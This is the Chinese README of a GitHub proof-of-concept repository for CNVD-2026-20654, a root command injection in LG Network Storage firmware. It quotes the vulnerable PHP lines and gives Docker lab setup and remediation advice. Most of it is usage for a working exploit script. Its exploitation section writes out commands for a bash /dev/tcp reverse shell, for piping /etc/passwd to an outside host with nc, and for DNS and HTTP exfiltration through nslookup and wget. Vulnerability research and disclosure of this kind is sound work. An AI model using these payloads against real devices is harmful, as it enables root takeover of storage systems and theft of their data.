# CNVD-2026-20654 LG Network Storage 命令注入漏洞

[![Quality](https://github.com/bx33661/CNVD-2026-20654-lg-nas-command-injection/actions/workflows/quality.yml/badge.svg)](https://github.com/bx33661/CNVD-2026-20654-lg-nas-command-injection/actions/workflows/quality.yml)
[![Python 3](https://img.shields.io/badge/python-3.9%2B-blue.svg)](https://www.python.org/)

[English](README.md) | [中文](README_zh.md)

---

## 概述

本仓库包含针对 **CNVD-2026-20654** 的完整安全研究项目，这是 LG Network Storage 设备中的一个严重命令注入漏洞。该漏洞允许远程攻击者以 root 权限执行任意命令。

**CVSS 评分: 8.8 (高危)**

## 目录

- [漏洞详情](#漏洞详情)
- [影响版本](#影响版本)
- [PoC 使用](#poc-使用)
- [环境搭建](#环境搭建)
- [利用方法](#利用方法)
- [版本分析](#版本分析)
- [修复建议](#修复建议)
- [免责声明](#免责声明)

## 漏洞详情

- **漏洞编号**: CNVD-2026-20654
- **漏洞类型**: OS 命令注入 (CWE-78)
- **CVSS 评分**: 8.8 (高危)
- **攻击向量**: 网络（远程）
- **所需权限**: 低（需要有效账户）
- **用户交互**: 无
- **影响**: 以 root 权限完全控制系统

### 漏洞代码位置

1. **第 28 行** (`share_set_user_info.php`):
   ```php
   $userpasswd = trim(shell_exec("sudo nas-common md5 $userpasswd"));
   ```

2. **第 78 行** (`share_set_user_info.php`):
   ```php
   $check = trim(exec("sudo nas-share check_user $userID"));
   ```

## 影响版本

**已测试的固件版本**（全部确认存在漏洞）:
- 1.0.0_2407 (2009-12-29)
- 1.0.0_2450 (2010-02-11)
- 1.0.0_2504
- 1.0.0_2557 (2010-09-12)
- 1.0.0_2569 (2010-10-28)

**分析结果**: 本地验证的 2569 镜像与官方 2450/2569 固件中的 `share_set_user_info.php` 完全一致（SHA-256: `fea1bea6cb88aaad494b9c357f3b12b345b4816c4706799195209e5ef6f29336`）。

## PoC 使用

### 快速开始

```bash
# 克隆仓库
git clone https://github.com/bx33661/CNVD-2026-20654-lg-nas-command-injection.git
cd CNVD-2026-20654-lg-nas-command-injection

# 启动漏洞环境
cd environment
docker compose up -d

# 运行 PoC，并使用本地证明文件验证
cd ..
python3 poc.py \
  --target http://127.0.0.1:8000 \
  --username admin \
  --password admin \
  --injection-point userid \
  --proof-file /var/www/en/cnvd_rce_proof.txt
```

证明文件模式仅允许回环地址。它会在本地实验环境的 Web 根目录写入唯一标记和执行 UID，再通过 HTTP 读回；返回 `uid=0` 可以直接证明命令在 root 上下文执行。

### PoC 功能特性

- 自动登录功能
- 多种利用方式
- 支持两个注入点
- 已修复代理问题
- 时间盲注
- 仅限回环地址的证明文件模式，并自动读回校验
- 非 blind 模式不会把 HTTP 200 直接当作 RCE 确认
- 反弹 shell 支持
- DNS/HTTP 外带

## 环境搭建

### 前置要求

- Docker & Docker Compose
- Python 3.9+
- `requirements.txt` 中列出的 Python 依赖

```bash
python3 -m pip install -r requirements.txt
```

### Docker 环境

```bash
cd environment
docker compose up -d

# 检查容器状态
docker compose ps

# 查看日志
docker compose logs -f
```

漏洞服务将在 `http://localhost:8000` 上运行

默认凭据:
- 用户名: `admin`
- 密码: `admin`

## 利用方法

### 方法 1: 时间盲注（推荐用于验证）

```bash
python3 poc.py \
  --target http://目标:8000 \
  --username admin \
  --password admin \
  --injection-point userid \
  --method blind
```

**结果**: 响应延迟 5+ 秒即可确认漏洞存在

### 方法 2: 文件标记证明（仅限本地实验环境）

```bash
python3 poc.py \
  --target http://127.0.0.1:8000 \
  --username admin \
  --password admin \
  --injection-point userid \
  --proof-file /var/www/en/cnvd_rce_proof.txt
```

PoC 会生成唯一标记，通过漏洞路径写入文件，再通过 HTTP 读回。输出中同时出现唯一标记和 `uid=0` 时，即可确认 root 权限命令执行。不要对公网或非回环目标使用 `--proof-file`。

### 方法 3: 反弹 shell（仅限授权测试）

```bash
# 在你的服务器上监听
nc -l 4444

# 执行 PoC
python3 poc.py \
  --target http://目标:8000 \
  --username admin \
  --password admin \
  --command "bash -c 'bash -i >& /dev/tcp/你的IP/4444 0>&1'"
```

### 方法 4: 通过反弹 shell 外带数据

```bash
# 在你的服务器上
nc -l 4444 > output.txt

# 执行 PoC
python3 poc.py \
  --target http://目标:8000 \
  --username admin \
  --password admin \
  --command "cat /etc/passwd | nc 你的IP 4444"
```

### 方法 5: DNS/HTTP 外带

```bash
# DNS 外带
python3 poc.py \
  --target http://目标:8000 \
  --username admin \
  --password admin \
  --command "nslookup \$(whoami).你的域名.com"

# HTTP 外带
python3 poc.py \
  --target http://目标:8000 \
  --username admin \
  --password admin \
  --command "wget --post-data=\$(whoami) http://你的服务器/collect"
```

## 版本分析

我们测试了 **5 个固件版本**，时间跨度 **10 个月**（2009-12 到 2010-10）:

| 版本 | 发布日期 | 漏洞代码 | 本地证明 |
|------|----------|----------|----------|
| 2407 | 2009-12-29 | 存在漏洞 | 当前环境未测试 |
| 2450 | 2010-02-11 | 已验证代码一致 | 固件包比对 |
| 2504 | 未知 | 存在漏洞 | 当前环境未测试 |
| 2557 | 2010-09-12 | 存在漏洞 | 当前环境未测试 |
| 2569 | 2010-10-28 | 已验证代码一致 | root 标记读回 |

**关键发现**:
- 本地验证的 2450 和 2569 固件包含相同的漏洞代码
- 命令没有回显时，可以使用时间盲注观察延迟
- 本地 2569 环境已通过证明文件确认文件创建和 `uid=0`
- `ok:ID_conflict` 是应用状态，不是命令输出

## 验证结果

| 测试项 | 状态 | 证据 |
|--------|------|------|
| 命令注入 | 本地 2569 已确认 | 唯一标记读回 |
| 执行权限 | Root (UID 0) | 证明文件包含 `uid=0` |
| 时间盲注 | 成功 | 约 5 秒延迟 |
| 命令直接回显 | 未返回 | 接口返回应用状态 |
| 仅凭 HTTP 200 | 证据不足 | PoC 会标记为未确认 |

## 修复建议

1. **升级固件** 到最新的已修复版本
2. **限制网络访问** 到 Web 管理界面
3. **实施输入验证** 和过滤
4. **使用 Web 应用防火墙 (WAF)**
5. **监控可疑活动**

## 免责声明

本项目仅用于**教育和安全研究目的**。

- 仅在你拥有或有明确授权的系统上进行测试
- `--proof-file` 仅用于本地回环实验环境
- 作者不对任何滥用或损害负责
- 请负责任和道德地使用这些信息

## 参考资料

- CNVD: https://www.cnvd.org.cn/flaw/show/CNVD-2026-20654
- CWE-78: OS Command Injection
- CVSS v3.1 Calculator

## 作者

- GitHub: [@bx33661](https://github.com/bx33661)
- 项目: [CNVD-2026-20654-lg-nas-command-injection](https://github.com/bx33661/CNVD-2026-20654-lg-nas-command-injection)

## 许可

本项目仅供教育目的提供。请负责任地使用。

---

**如果你觉得这个研究有帮助，请考虑给个 Star！**
